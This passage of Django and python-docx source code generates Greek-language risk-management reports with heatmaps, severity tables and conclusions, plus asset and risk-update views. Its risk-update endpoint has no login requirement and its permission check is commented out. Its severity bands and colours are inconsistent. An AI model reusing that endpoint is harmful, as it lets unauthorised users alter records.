    tc = cell._element.tcPr
    borders = OxmlElement('w:tcBorders')
    for border_name in ['top', 'left', 'bottom', 'right']:
        border = OxmlElement(f'w:{border_name}')
        border.set(qn('w:val'), 'single')  # Set border type to single line
        border.set(qn('w:sz'), '4')  # Border size
        border.set(qn('w:space'), '0')  # No space around the border
        border.set(qn('w:color'), '000000')  # Border color: black
        borders.append(border)
    tc.append(borders)



# # Function to convert hex to RGB
def hex_to_rgb(hex_color):
    hex_color = hex_color.lstrip('#')  # Remove the # symbol if present
    return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))  # Convert hex to RGB


# Function to format the risk score calculation and severity in the correct color
def format_risk_score(run, likelihood, impact, score, severity_label, severity_color):
    run.add_text(f'Likelihood ({likelihood}) x Impact ({impact}) = {score} ({severity_label})')
    run.font.color.rgb = RGBColor(*hex_to_rgb(severity_color))



from django.http import HttpResponse
from docx import Document
from docx.shared import Pt, RGBColor
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from django.templatetags.static import static
import os
from .models import Risk, Portfolio
import re
from django.contrib.staticfiles import finders

# Function to clean HTML tags from TinyMCE content
def clean_html_tags(text):
    return re.sub(r'<.*?>', '', text)  # Simple regex to remove HTML tags

# Function to add page numbers in the footer
from docx.oxml import OxmlElement
from docx.oxml.ns import qn

from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT

def add_page_numbers_gr(document):
    section = document.sections[0]
    footer = section.footer.paragraphs[0]

    # Add page numbering on the left
    footer.text = "Page "
    run = footer.add_run()
    fldChar = OxmlElement('w:fldChar')
    fldChar.set(qn('w:fldCharType'), 'begin')

    instrText = OxmlElement('w:instrText')
    instrText.set(qn('xml:space'), 'preserve')
    instrText.text = "PAGE"
    fldChar2 = OxmlElement('w:fldChar')
    fldChar2.set(qn('w:fldCharType'), 'end')
    run._r.append(fldChar)
    run._r.append(instrText)
    run._r.append(fldChar2)

    footer.add_run(" of ")
    run = footer.add_run()
    fldChar = OxmlElement('w:fldChar')
    fldChar.set(qn('w:fldCharType'), 'begin')

    instrText = OxmlElement('w:instrText')
    instrText.set(qn('xml:space'), 'preserve')
    instrText.text = "NUMPAGES"
    fldChar2 = OxmlElement('w:fldChar')
    fldChar2.set(qn('w:fldCharType'), 'end')
    run._r.append(fldChar)
    run._r.append(instrText)
    run._r.append(fldChar2)

    # Add a new paragraph for the "Confidential for internal use" text in Greek
    center_paragraph = section.footer.add_paragraph()
    center_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
    center_run = center_paragraph.add_run("Απόρρητο για εσωτερική χρήση")
    center_run.bold = True

# Function to add a company logo in the header
def add_company_logo_gr(document, logo_path):
    header = document.sections[0].header
    paragraph = header.paragraphs[0]
    run = paragraph.add_run()
    run.add_picture(logo_path, width=Pt(100))  # Adjust width as necessary

# Function to set the document font to Calibri


def set_calibri_font(document):
    style = document.styles['Normal']
    font = style.font
    font.name = 'Calibri'
    font.size = Pt(11)



# Function to add Table of Contents (TOC)
from docx.oxml import OxmlElement
from docx.oxml.ns import qn

def add_table_of_contents_gr(document):
    # Add a heading for the Table of Contents
    toc_heading = document.add_paragraph('Πίνακας Περιεχομένων', style='Heading 2')

    # Create the TOC field element
    paragraph = document.add_paragraph()
    run = paragraph.add_run()

    # Add field code for TOC (Word requires the document to be updated to show the TOC)
    fldChar1 = OxmlElement('w:fldChar')
    fldChar1.set(qn('w:fldCharType'), 'begin')
    run._r.append(fldChar1)

    instrText = OxmlElement('w:instrText')
    instrText.set(qn('xml:space'), 'preserve')
    instrText.text = 'TOC \\o "1-1" \\h \\z \\u'  # TOC field code updated to level 1 only
    run._r.append(instrText)

    fldChar2 = OxmlElement('w:fldChar')
    fldChar2.set(qn('w:fldCharType'), 'end')
    run._r.append(fldChar2)



from docx.shared import Pt

def add_cover_page_gr(document):
    # Add some vertical space
    document.add_paragraph('\n' * 5)  # Adds space at the top of the page.

    # Add title with centered alignment
    paragraph = document.add_paragraph()
    paragraph.alignment = 1  # Center alignment
    run = paragraph.add_run('Έκθεση Διαχείρισης Κινδύνων')
    run.bold = True
    run.font.size = Pt(24)

    # Centered subtexts
    paragraph = document.add_paragraph()
    paragraph.alignment = 1  # Center alignment
    run = paragraph.add_run('Παρουσίαση Στην Επιτροπή Διαχείρισης Κινδύνων / Διοικητικό Συμβούλιο')
    run.font.size = Pt(14)

    paragraph = document.add_paragraph()
    paragraph.alignment = 1  # Center alignment
    run = paragraph.add_run('AVAX Α.Ε.')
    run.font.size = Pt(14)

    paragraph = document.add_paragraph()
    paragraph.alignment = 1  # Center alignment
    # Use datetime.now() to get the current year
    # run = paragraph.add_run(f'Έτος: ')
    run.font.size = Pt(14)

    paragraph = document.add_paragraph()
    paragraph.alignment = 1  # Center alignment
    run = paragraph.add_run('Εκπονήθηκε από: Μονάδα Διαχείρισης Κινδύνων')
    run.font.size = Pt(14)

    # Add another page break
    document.add_page_break()


import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
import io
import base64
from matplotlib.colors import ListedColormap, BoundaryNorm
from docx.shared import Inches  # Ensure this line is included



def get_heatmap_color(score):
    """
    Returns the color based on the risk score.
    Green: Low risk (1-6), orange: Medium risk (8-12), Red: High risk (15-25), White for scores outside range
    """
    if score >= 1 and score <= 6:
            return 'green'
    elif score >= 8 and score <= 12:
            return 'orange'
    elif score >= 15 and score <= 25:
            return 'red'
    else:
            return 'white'

import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
from matplotlib.colors import ListedColormap
import io
import base64


import matplotlib.pyplot as plt
import seaborn as sns
import numpy as np
import io
import base64
from matplotlib.colors import ListedColormap

import io
import base64
import numpy as np
import seaborn as sns
import matplotlib.pyplot as plt
from matplotlib.colors import ListedColormap

def get_heatmap_color(score):
    """
    Returns the color based on the risk score:
    - Green if 1 <= score <= 6
    - Orange if 8 <= score <= 12
    - Red if 15 <= score <= 25
    - White otherwise (including 7, 13, 14, etc.)
    """
    if 1 <= score <= 6:
        return 'green'
    elif 8 <= score <= 12:
        return 'orange'
    elif 15 <= score <= 25:
        return 'red'
    else:
        return 'white'

def generate_heatmap_image(title, risk_data, risk_type):
    plt.figure(figsize=(6, 4))

    # Prepare the score matrix (Impact x Likelihood) and count matrix
    score_matrix = np.zeros((5, 5), dtype=int)
    count_matrix = np.zeros((5, 5), dtype=int)
    annot_matrix = [['' for _ in range(5)] for _ in range(5)]
    color_matrix = [['white' for _ in range(5)] for _ in range(5)]

    # For bubble plotting
    likelihoods = []
    impacts = []
    sizes = []
    counts = []

    # Totals
    total_high = 0
    total_medium = 0
    total_low = 0
    total_risks = 0

    # Populate the matrices
    for i in range(5):
        for j in range(5):
            # Collect the risks in this cell
            risks = risk_data[i][j] if i < len(risk_data) and j < len(risk_data[i]) else []
            count = len(risks)
            count_matrix[i, j] = count
            total_risks += count

            # Calculate the risk score
            score = (i + 1) * (j + 1)
            score_matrix[i, j] = score

            # Assign color based on fixed bands
            color_matrix[i][j] = get_heatmap_color(score)

            # Count how many belong to each band
            if count > 0:
                if 1 <= score <= 6:
                    total_low += count
                elif 8 <= score <= 12:
                    total_medium += count
                elif 15 <= score <= 25:
                    total_high += count

                # For bubble placement: center each bubble in its cell
                likelihoods.append(5 - i - 0.5)
                impacts.append(j + 0.5)
                sizes.append(count * 100)  # Scale bubbles
                counts.append(count)
                annot_matrix[i][j] = str(count)

    # Create a blank/white heatmap first
    ax = sns.heatmap(
        score_matrix[::-1],
        annot=np.array(annot_matrix[::-1]),
        cmap=ListedColormap(['white']),
        cbar=False,
        fmt='',
        linewidths=1.5
    )

    # Apply custom colors to each cell
    # Reversed row (i) because heatmap in seaborn inverts the y-axis
    for i in range(5):
        for j in range(5):
            ax.add_patch(
                plt.Rectangle(
                    (j, 4 - i), 1, 1,
                    fill=True,
                    color=color_matrix[i][j],
                    edgecolor='black',
                    lw=1.5
                )
            )

    # Overlay bubbles
    plt.scatter(impacts, likelihoods, s=sizes, alpha=0.6, edgecolors="w", linewidth=0.5)

    # Add text inside each bubble
    for impact, likelihood, c in zip(impacts, likelihoods, counts):
        plt.text(
            impact, likelihood, str(c),
            fontsize=10, ha='center', va='center',
            color='black', fontweight='bold'
        )

    # Move the textual info to bottom-left region
    # We'll use axis coordinates (transform=ax.transAxes) for consistent placement
    # near the bottom-left corner.
    text_str = (
        f"Total Risks: {total_risks}\n"
        f"Total High: {total_high}\n"
        f"Total Medium: {total_medium}\n"
        f"Total Low: {total_low}"
    )
    plt.text(
        0.02, -0.20, text_str,
        transform=ax.transAxes,
        fontsize=10,
        ha='left', va='center', color='black', fontweight='bold'
    )

    # Title and labels
    ax.set_title(title, fontsize=12)
    ax.set_xlabel('Impact (1-5)', fontsize=10)
    ax.set_ylabel('Likelihood (1-5)', fontsize=10)
    ax.set_xticks([0.5, 1.5, 2.5, 3.5, 4.5])
    ax.set_yticks([0.5, 1.5, 2.5, 3.5, 4.5])
    ax.set_xticklabels(['1', '2', '3', '4', '5'], fontsize=8)
    ax.set_yticklabels(['5', '4', '3', '2', '1'], rotation=0, fontsize=8)

    plt.tight_layout()

    # Save to a BytesIO buffer
    buffer = io.BytesIO()
    plt.savefig(buffer, format='png', bbox_inches='tight')
    plt.close()
    buffer.seek(0)

    # Encode to base64
    image_base64 = base64.b64encode(buffer.read()).decode('utf-8')

    return image_base64, count_matrix, score_matrix
from docx import Document

from docx.shared import RGBColor


from docx.oxml import OxmlElement
from docx.oxml.ns import qn

def generate_heatmap_commentary(count_matrix, score_matrix, doc):
    high_risk_positions = []
    medium_risk_positions = []
    low_risk_positions = []

    # Identify high, medium, and low risk areas
    for i in range(5):
        for j in range(5):
            likelihood = i + 1
            impact = j + 1
            score = score_matrix[i, j]
            count = count_matrix[i, j]

            # High risk (score >= 15)
            if score >= 15 and count > 0:
                high_risk_positions.append((likelihood, impact, count, likelihood * impact))
            # Medium risk (score 7-14)
            elif 7 <= score <= 14 and count > 0:
                medium_risk_positions.append((likelihood, impact, count, likelihood * impact))
            # Low risk (score <= 6)
            elif score <= 6 and count > 0:
                low_risk_positions.append((likelihood, impact, count, likelihood * impact))

    # Helper function to set background color for a cell
    def set_cell_background_color(cell, color_hex):
        # Get the cell properties element (<w:tcPr>)
        tc_pr = cell._element.get_or_add_tcPr()
        # Create a new shading element (<w:shd>) with the specified fill color
        shd = OxmlElement('w:shd')
        shd.set(qn('w:val'), 'clear')
        shd.set(qn('w:color'), 'auto')
        shd.set(qn('w:fill'), color_hex)
        # Add the shading element to the cell properties
        tc_pr.append(shd)

    # Create tables for high, medium, and low risk areas
    if high_risk_positions:
        doc.add_paragraph("Περιοχές Υψηλού Κινδύνου")
        high_risk_table = doc.add_table(rows=1, cols=4)
        high_risk_table.style = 'Table Grid'
        hdr_cells = high_risk_table.rows[0].cells
        hdr_cells[0].text = 'Πιθανότητα'
        hdr_cells[1].text = 'Επίδραση'
        hdr_cells[2].text = 'Αριθμός Κινδύνων'
        hdr_cells[3].text = 'Πιθανότητα x Επίδραση'

        for pos in high_risk_positions:
            row_cells = high_risk_table.add_row().cells
            row_cells[0].text = str(pos[0])
            row_cells[1].text = str(pos[1])
            row_cells[2].text = str(pos[2])
            row_cells[3].text = str(pos[3])

            # Apply red color for high risk
            for cell in row_cells:
                set_cell_background_color(cell, 'FF0000')

    if medium_risk_positions:
        doc.add_paragraph("Περιοχές Μεσαίου Κινδύνου")
        medium_risk_table = doc.add_table(rows=1, cols=4)
        medium_risk_table.style = 'Table Grid'
        hdr_cells = medium_risk_table.rows[0].cells
        hdr_cells[0].text = 'Πιθανότητα'
        hdr_cells[1].text = 'Επίδραση'
        hdr_cells[2].text = 'Αριθμός Κινδύνων'
        hdr_cells[3].text = 'Πιθανότητα x Επίδραση'

        for pos in medium_risk_positions:
            row_cells = medium_risk_table.add_row().cells
            row_cells[0].text = str(pos[0])
            row_cells[1].text = str(pos[1])
            row_cells[2].text = str(pos[2])
            row_cells[3].text = str(pos[3])

            # Apply orange color for medium risk
            for cell in row_cells:
                set_cell_background_color(cell, 'FFFF00')

    if low_risk_positions:
        doc.add_paragraph("Περιοχές Χαμηλού Κινδύνου")
        low_risk_table = doc.add_table(rows=1, cols=4)
        low_risk_table.style = 'Table Grid'
        hdr_cells = low_risk_table.rows[0].cells
        hdr_cells[0].text = 'Πιθανότητα'
        hdr_cells[1].text = 'Επίδραση'
        hdr_cells[2].text = 'Αριθμός Κινδύνων'
        hdr_cells[3].text = 'Πιθανότητα x Επίδραση'

        for pos in low_risk_positions:
            row_cells = low_risk_table.add_row().cells
            row_cells[0].text = str(pos[0])
            row_cells[1].text = str(pos[1])
            row_cells[2].text = str(pos[2])
            row_cells[3].text = str(pos[3])

            # Apply green color for low risk
            for cell in row_cells:
                set_cell_background_color(cell, '00FF00')


# views.py
from django.views.generic import ListView
from .models import ITAsset

from django.contrib.auth.mixins import LoginRequiredMixin
from django.views.generic import ListView
from .models import ITAsset

from django.contrib.auth.mixins import LoginRequiredMixin
from django.views.generic import ListView
from .models import ITAsset

class ITAssetRiskListView(LoginRequiredMixin, ListView):
    model = ITAsset
    template_name = 'itassets_with_risks.html'
    context_object_name = 'assets'

    def get_queryset(self):
        user = self.request.user

        # Superusers see all assets, ordered by last updated
        if user.is_superuser:
            return ITAsset.objects.all().order_by('-last_updated')

        # Regular users see only assets in their assigned portfolios, ordered by last updated
        if hasattr(user, 'userprofile') and user.userprofile.portfolios.exists():
            return ITAsset.objects.filter(portfolio__in=user.userprofile.portfolios.all()) \
                                 .distinct() \
                                 .order_by('name')

        # If no portfolio assigned, return an empty queryset
        return ITAsset.objects.none()


import json
from django.http import JsonResponse
from django.views import View
from django.shortcuts import get_object_or_404
from django.utils.decorators import method_decorator
from django.views.decorators.csrf import csrf_exempt  # If necessary; usually not needed if CSRF token is provided

from .models import Risk

class UpdateRiskTreatmentView(View):
    def post(self, request, pk, *args, **kwargs):
        # Get the risk object or return a 404 if not found.
        risk = get_object_or_404(Risk, pk=pk)
        
        try:
            data = json.loads(request.body)
            treatment_type = data.get("treatment_type", None)
            # Validate the treatment_type against the allowed choices.
            if treatment_type not in dict(Risk.TREATMENT_CHOICES):
                return JsonResponse({"success": False, "error": "Invalid treatment type"}, status=400)
            
            # Optionally, check if the user has permission to update this risk.
            # For example:
            # if not request.user.is_superuser and risk.last_assessed_by != request.user:
            #     return JsonResponse({"success": False, "error": "Not authorized"}, status=403)
            
            risk.treatment_type = treatment_type
            risk.save()
            return JsonResponse({"success": True})
        except json.JSONDecodeError:
            return JsonResponse({"success": False, "error": "Invalid JSON"}, status=400)
        except Exception as e:
            return JsonResponse({"success": False, "error": str(e)}, status=400)




import matplotlib.pyplot as plt
import io
import base64
from django.db.models import Count
from docx.shared import Inches
from docx.shared import RGBColor  # Correct import for RGBColor from python-docx
from .models import Category  # Import the Category model



from docx.shared import Inches
import io
import base64

def add_risk_severity_table(document):
        # Add a heading for the Risk Severity Table
        document.add_heading('Κατηγοριοποίηση Σοβαρότητας Κινδύνου\n', level=2)
        severity_table = document.add_table(rows=1, cols=2)
        severity_table.style = 'Table Grid'

        # Header row for the severity table
        severity_hdr_cells = severity_table.rows[0].cells
        severity_hdr_cells[0].text = 'Βαθμολογία Κινδύνου (Risk Score)'
        severity_hdr_cells[1].text = 'Σοβαρότητα Κινδύνου (Severity Level)'

        # Data for severity classification with relevant colors
        severity_data = [
            ('1 - 6', 'Χαμηλή (Πράσινο)', '00B050'),  # Green background
            ('8 - 12', 'Μέτρια (Κίτρινο)', 'orange'),  # orange background
            ('15 - 25', 'Υψηλή (Κόκκινο)', 'red')   # Red background
        ]

        # Add rows dynamically based on severity_data and color the cells
        for score_range, severity, color_hex in severity_data:
            row_cells = severity_table.add_row().cells
            row_cells[0].text = score_range
            row_cells[1].text = severity

            # Apply background color to both cells in the row
            for cell in row_cells:
                # Get the table cell properties element (<w:tcPr>)
                tc_pr = cell._element.get_or_add_tcPr()
                # Create a new shading element (<w:shd>) with the specified fill color
                shd = OxmlElement('w:shd')
                shd.set(qn('w:val'), 'clear')
                shd.set(qn('w:color'), 'auto')
                shd.set(qn('w:fill'), color_hex)
                # Add the shading element to the cell properties
                tc_pr.append(shd)



def add_executive_summary_gr(document):
    document.add_page_break()

    # Executive Summary Title
    document.add_heading('\nΔιοικητική Περίληψη (Executive Summary)', level=1)

# Brief introduction to the concepts
    document.add_paragraph(
        '\nΗ παρούσα αναφορά παρέχει μια ολοκληρωμένη ανάλυση των δραστηριοτήτων διαχείρισης κινδύνων που πραγματοποιήθηκαν κατά τη διάρκεια του έτους. '
        'Ο κύριος στόχος της στρατηγικής διαχείρισης κινδύνων για το τρέχον έτος ήταν η μείωση των κινδύνων υψηλής προτεραιότητας και η ευθυγράμμιση '
        'των πρακτικών διαχείρισης κινδύνων με τους στρατηγικούς στόχους του οργανισμού. '
    )


    document.add_paragraph(
    "\nΗ σύνοψη που ακολουθεί παρέχει μια επισκόπηση του τοπίου κινδύνου, προσφέροντας ανάλυση των βαθμολογιών κινδύνου για κάθε κατηγορία: "
    "εγγενείς, υπολειμματικές και στοχευμένες βαθμολογίες."
)



    # Brief explanation of risk scoring
    document.add_heading('Μεθοδολογία Αξιολόγησης Κινδύνων\n', level=2)
    document.add_paragraph(
        'Κάθε κίνδυνος αξιολογείται βάσει δύο βασικών διαστάσεων: της πιθανότητας εμφάνισης (Likelihood) του κινδύνου και της δυνητικής επίπτωσης (Impact) στον οργανισμό. '
        'Η βαθμολογία κινδύνου υπολογίζεται πολλαπλασιάζοντας τη βαθμολογία πιθανότητας με τη βαθμολογία επίπτωσης.(Likelihood x Impact=Risk Score)'
    )


    # Add a table for Likelihood and Impact Scores
    table = document.add_table(rows=1, cols=3)
    table.style = 'Table Grid'

    # Set up the header row
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = 'Βαθμολογία (Score)'
    hdr_cells[1].text = 'Πιθανότητα (Likelihood)'
    hdr_cells[2].text = 'Επίπτωση (Impact)'

# Data for each score
    table_data = [
        (1, 'Πολύ Χαμηλή: Απίθανο να συμβεί', 'Ελάχιστη επίπτωση'),
        (2, 'Χαμηλή: Μικρή πιθανότητα εμφάνισης', 'Περιορισμένη επίπτωση'),
        (3, 'Μέτρια: Πιθανή εμφάνιση', 'Αξιοσημείωτη επίπτωση'),
        (4, 'Υψηλή: Πιθανή εμφάνιση', 'Σημαντική επίπτωση'),
        (5, 'Πολύ Υψηλή: Σχεδόν βέβαιη εμφάνιση', 'Σοβαρή επίπτωση')
    ]

    add_risk_severity_table(document)

    # Add rows dynamically based on table_data
    for score, likelihood, impact in table_data:
        row_cells = table.add_row().cells
        row_cells[0].text = str(score)
        row_cells[1].text = likelihood
        row_cells[2].text = impact

  

   

    # Initialize matrices for storing risks data
    inherent_data = [[[] for _ in range(5)] for _ in range(5)]
    residual_data = [[[] for _ in range(5)] for _ in range(5)]
    targeted_data = [[[] for _ in range(5)] for _ in range(5)]

    # Retrieve risks from the database
    from django.db.models import Q

    risks = Risk.objects.exclude(
        Q(portfolio__name__icontains='archive') | 
        Q(portfolio__name__icontains='sub') | 
        Q(portfolio__name__icontains='set')
    )


# Exclude risks in portfolios with names containing "set" or "sub"
    filtered_risks = risks.exclude(
        Q(portfolio__name__icontains='set') | 
        Q(portfolio__name__icontains='sub')
    )

    # Count the total number of filtered risks
    total_risks = filtered_risks.count()

    total_risks = risks.count()  # Count the total number of risks
    for risk in risks:
        inherent_data[risk.inherent_likelihood - 1][risk.inherent_impact - 1].append(risk)
        residual_data[risk.residual_likelihood - 1][risk.residual_impact - 1].append(risk)
        targeted_data[risk.targeted_likelihood - 1][risk.targeted_impact - 1].append(risk)

    # Add total number of risks to the document
    document.add_paragraph('\n')
    paragraph = document.add_paragraph()
    run1 = paragraph.add_run('Συνολικός αριθμός ενεργών κινδύνων για ολόκληρο τον Όμιλο AVAX: ')
    run2 = paragraph.add_run(f'{total_risks}')
    run2.bold = True
    
        
    
    
    add_risk_management_process_section(document)


  # 
    # Section for Inherent Risk Score
    document.add_heading('\nΕγγενείς (Inherent) Βαθμολογίες Κινδύνου', level=2)
    paragraph1 = document.add_paragraph()
    run1 = paragraph1.add_run('\nΗ Εγγενής (Inherent) Βαθμολογία Κινδύνου ')
    run1.bold = True
    run2 = paragraph1.add_run(
        'αντιπροσωπεύει το αρχικό επίπεδο κινδύνου που σχετίζεται με μια δραστηριότητα ή διαδικασία, '
        'χωρίς να λαμβάνονται υπόψη τα μέτρα μετριασμού.'
    )

    # New paragraph for additional explanation
    paragraph2 = document.add_paragraph(
    'Στον κατασκευαστικό κλάδο, οι εγγενείς (Inherent) κίνδυνοι είναι ιδιαίτερα αυξημένοι λόγω της φύσης των εργασιών. '
    'Αυτοί οι κίνδυνοι περιλαμβάνουν εργασίες σε μεγάλα ύψη, τη χρήση βαρέων μηχανημάτων και εξοπλισμού, '
    'καθώς και την εκτέλεση περίπλοκων δομικών διεργασιών. Οι παράγοντες αυτοί αποτελούν αναπόσπαστο μέρος της καθημερινής λειτουργίας, '
    'απαιτώντας συνεχή αξιολόγηση και προσοχή για την προστασία της ασφάλειας των εργαζομένων και τη διασφάλιση της ομαλής εκτέλεσης των έργων.'
)

    # Section for Residual Risk Score
    document.add_heading('\nΥπολειπόμενες (Residual) Βαθμολογίες Κινδύνου', level=2)
    paragraph3 = document.add_paragraph()
    run3 = paragraph3.add_run('\nΗ Υπολειπόμενη (Residual) Βαθμολογία Κινδύνου ')
    run3.bold = True
    run4 = paragraph3.add_run(
        'αξιολογεί τον κίνδυνο που απομένει μετά την εφαρμογή των μέτρων μετριασμού (Mitigations). Αν και αυτά τα μέτρα '
        'συμβάλλουν στη μείωση του κινδύνου, παραμένουν ορισμένοι κίνδυνοι που πρέπει να παρακολουθούνται.'
    )

    # New paragraph for comparison explanation
    paragraph4 = document.add_paragraph(
        'Η σύγκριση μεταξύ της Υπολειπόμενης και της Εγγενούς Βαθμολογίας Κινδύνου αποκαλύπτει την αποτελεσματικότητα '
        'των μέτρων μετριασμού, διασφαλίζοντας ότι οι εναπομείναντες κίνδυνοι είναι σε αποδεκτά επίπεδα.'
    )

    document.add_paragraph(
    'Τα παρακάτω διαγράμματα (Heatmaps) απεικονίζουν τον αριθμό κινδύνων σε κάθε συνδυασμό '
    'Πιθανότητας (Likelihood) x Επίπτωσης (Impact), δείχνοντας την κατανομή των κινδύνων ανάλογα με '
    'τα διάφορα επίπεδα σοβαρότητας.'
)
    document.add_paragraph(
    'Συγκρίνοντας τα διαγράμματα Εγγενών (Inherent) και Υπολειπόμενων (Residual) '
    'Βαθμολογιών Κινδύνου, παρατηρούμε πώς oι κίνδυνοι μετατοπίζονται σε λιγότερο σοβαρές κατηγορίες ως αποτέλεσμα των '
    'μέτρων μετριασμού, παρέχοντας μια ένδειξη της αποτελεσματικότητας των εφαρμοζόμενων στρατηγικών διαχείρισης κινδύνου.'
)




    # Inherent Risk Heatmap
    inherent_heatmap_base64, inherent_count_matrix, inherent_score_matrix = generate_heatmap_image(
        'Inherent Risk Scores Heatmap', inherent_data, 'inherent'
    )
    document.add_picture(io.BytesIO(base64.b64decode(inherent_heatmap_base64)), width=Inches(5))
    

    

    # Residual Risk Heatmap
    residual_heatmap_base64, residual_count_matrix, residual_score_matrix = generate_heatmap_image(
        'Residual Risk Scores Heatmap', residual_data, 'residual'
    )
    document.add_picture(io.BytesIO(base64.b64decode(residual_heatmap_base64)), width=Inches(5))

    document.add_page_break()

    # Section for Targeted Risk Score
    document.add_heading('\nΣτοχευμένες (Targeted) Βαθμολογίες Κινδύνου', level=2)
    paragraph5 = document.add_paragraph()
    run5 = paragraph5.add_run('\nΗ Στοχευμένη (Targeted) Βαθμολογία Κινδύνου ')
    run5.bold = True
    run6 = paragraph5.add_run(
        'καθορίζει το επιθυμητό επίπεδο κινδύνου που ο οργανισμός προσπαθεί να επιτύχει μέσω της εφαρμογής '
        'πρόσθετων μέτρων και στρατηγικών βελτίωσης. Στόχος είναι η περαιτέρω μείωση του κινδύνου σε επίπεδο '
        'που θεωρείται αποδεκτό για τη λειτουργία και τη συμμόρφωση.'
    )

    # New paragraph for additional explanation about Targeted Risk Score
    paragraph6 = document.add_paragraph(
        'Η Στοχευμένη (Targeted) Βαθμολογία Κινδύνου αντικατοπτρίζει τη δέσμευση του οργανισμού για συνεχή βελτίωση '
        'της ασφάλειας και της αποδοτικότητας.'
    )

     
    targeted_heatmap_base64, targeted_count_matrix, targeted_score_matrix = generate_heatmap_image(
        'Targeted Risk Scores Heatmap', targeted_data, 'targeted'
    )
    document.add_picture(io.BytesIO(base64.b64decode(targeted_heatmap_base64)), width=Inches(5))

        



    
    add_risk_breakdown_graphs_gr(document)

    
    
 
        
    generate_conclusion(
    inherent_count_matrix, inherent_score_matrix,
    residual_count_matrix, residual_score_matrix,
    targeted_count_matrix, targeted_score_matrix,
    document
)
    
     




    
    document.add_page_break()

def generate_conclusion(inherent_count_matrix, inherent_score_matrix,
                        residual_count_matrix, residual_score_matrix,
                        targeted_count_matrix, targeted_score_matrix, doc):
    # Calculate the total number of risks for each matrix
    total_risks = np.sum(inherent_count_matrix)

    # Identify high-level risks (Residual Risk Score >= 15)
    inherent_high_risks = np.sum(inherent_count_matrix[inherent_score_matrix >= 15])
    residual_high_risks = np.sum(residual_count_matrix[residual_score_matrix >= 15])
    targeted_high_risks = np.sum(targeted_count_matrix[targeted_score_matrix >= 15])

    # Identify medium-level risks (Inherent Risk Score 7-14)
    inherent_medium_risks = np.sum(inherent_count_matrix[(inherent_score_matrix >= 7) & (inherent_score_matrix <= 14)])
    residual_medium_risks = np.sum(residual_count_matrix[(residual_score_matrix >= 7) & (residual_score_matrix <= 14)])
    targeted_medium_risks = np.sum(targeted_count_matrix[(targeted_score_matrix >= 7) & (targeted_score_matrix <= 14)])

    # Identify low-level risks (Targeted Risk Score <= 6)
    inherent_low_risks = np.sum(inherent_count_matrix[inherent_score_matrix <= 6])
    residual_low_risks = np.sum(residual_count_matrix[residual_score_matrix <= 6])
    targeted_low_risks = np.sum(targeted_count_matrix[targeted_score_matrix <= 6])

    # Creating the summary section
    doc.add_paragraph("\nΣυμπεράσματα", style='Heading 2')
    doc.add_paragraph(
        f"\nΣυνολικά, εντοπίστηκαν {total_risks} κίνδυνοι κατά τη διαδικασία αξιολόγησης κινδύνων. "
        "Η παρούσα ανάλυση εξετάζει την κατανομή των κινδύνων βάσει των εγγενών (Inherent), υπολειμματικών (Residual) και στοχευμένων (Targeted) εκτιμήσεων."
    )

    # Inherent risk overview
    doc.add_paragraph(
        f"Στην εγγενή αξιολόγηση, εντοπίστηκαν {inherent_high_risks} κίνδυνοι υψηλού επιπέδου, "
        f"{inherent_medium_risks} μεσαίου επιπέδου και {inherent_low_risks} χαμηλού επιπέδου."
    )

    # Residual risk overview
    doc.add_paragraph(
        f"Μετά την εφαρμογή στρατηγικών μετριασμού, οι υπολειμματικοί κίνδυνοι σε υψηλό επίπεδο μειώθηκαν στους {residual_high_risks} "
        f"(μείωση από {inherent_high_risks}). Οι κίνδυνοι μεσαίου επιπέδου διαμορφώθηκαν στους {residual_medium_risks} "
        f"(αύξηση από {inherent_medium_risks}), ενώ οι χαμηλού επιπέδου ανήλθαν στους {residual_low_risks} "
        f"(αύξηση από {inherent_low_risks})."
    )

    # Targeted risk overview
    doc.add_paragraph(
        f"Στην στοχευμένη εκτίμηση, παραμένουν {targeted_high_risks} κίνδυνοι υψηλού επιπέδου "
        f"(από {residual_high_risks} στο υπολειμματικό στάδιο), {targeted_medium_risks} μεσαίου επιπέδου "
        f"(από {residual_medium_risks}) και {targeted_low_risks} χαμηλού επιπέδου (από {residual_low_risks})."
    )

    # Final Observations based on analysis
    doc.add_paragraph("\nΠαρατηρήσεις\n", style='Heading 2')

    # High risks
    if residual_high_risks > 0:
        doc.add_paragraph(
            f"Αξιοσημείωτο είναι ότι οι {residual_high_risks} περιοχές υψηλού κινδύνου απαιτούν συνεχή παρακολούθηση για ενίσχυση των μέτρων."
        )
    else:
        doc.add_paragraph(
            "Η αξιολόγηση δείχνει ότι οι στρατηγικές μετριασμού έχουν εξαλείψει τους υψηλού επιπέδου κινδύνους, επιτυγχάνοντας σημαντική βελτίωση."
        )

    # Medium risks
    if residual_medium_risks > inherent_medium_risks:
        doc.add_paragraph(
            f"Η αύξηση των μεσαίου επιπέδου κινδύνων στους {residual_medium_risks} από {inherent_medium_risks} προέρχεται από τη μείωση υψηλότερων κινδύνων, "
            "υποδεικνύοντας βελτίωση στο χειρισμό σοβαρότερων κινδύνων."
        )

    # Low risks
    if residual_low_risks > inherent_low_risks:
        doc.add_paragraph(
            f"Η αύξηση των χαμηλού κινδύνου περιοχών στους {residual_low_risks} από {inherent_low_risks} αποτυπώνει την επιτυχημένη μετάβαση σε περισσότερο ελεγχόμενα επίπεδα."
        )

    # Targeted risks
    if targeted_high_risks > residual_high_risks:
        doc.add_paragraph(
            f"Παρά τη μείωση, παραμένουν {targeted_high_risks} υψηλού επιπέδου στοχευμένοι κίνδυνοι (από {residual_high_risks} στο υπολειμματικό στάδιο). Σημειώνεται ανάγκη περαιτέρω προσαρμογής των μέτρων."
        )

    # Final summary
    doc.add_paragraph(
        "Εν κατακλείδι, η ανάλυση των κινδύνων αποδεικνύει τη σταδιακή μετακίνηση προς χαμηλότερα επίπεδα σοβαρότητας κινδύνου, "
        "με σημαντική βελτίωση σε περιοχές υψηλού κινδύνου. Ωστόσο, απαιτείται συνεχής προσοχή στους μεσαίους κινδύνους."
    )


def add_risk_breakdown_graphs_gr(document):
   
    document.add_page_break()

   # Example: Number of risks per portfolio
    document.add_heading('\nΑριθμός Κινδύνων ανά Χαρτοφυλάκιο', level=2)
